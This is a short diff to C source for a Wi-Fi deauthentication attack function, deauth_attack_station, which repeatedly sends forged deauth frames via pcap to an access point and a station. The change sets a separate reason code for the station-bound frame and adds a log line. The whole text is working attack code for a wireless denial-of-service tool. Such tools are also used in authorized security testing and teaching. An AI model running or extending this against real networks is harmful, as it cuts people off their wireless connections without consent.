@@ -93,6 +93,7 @@ int deauth_attack_station(const char* interface, const char* ap_mac, const char*
     deAuthFixParam fix_param;
     fix_param.reason_code = 0x0003;
     memcpy((uint8_t*)frame_to_ap + sizeof(Frame), &fix_param, sizeof(deAuthFixParam));
+    fix_param.reason_code = 0x0001;
     memcpy((uint8_t*)frame_to_sta + sizeof(Frame), &fix_param, sizeof(deAuthFixParam));
 
 
@@ -109,6 +110,7 @@ int deauth_attack_station(const char* interface, const char* ap_mac, const char*
         pcap_sendpacket(handle, (unsigned char*)frame_to_ap, sizeof(Frame) + sizeof(deAuthFixParam));
         pcap_sendpacket(handle, (unsigned char*)frame_to_sta, sizeof(Frame) + sizeof(deAuthFixParam));
         puts("send station's deauth frame to ap");
+        puts("send ap's deauth frame to station");
         usleep(500000);
     }
 
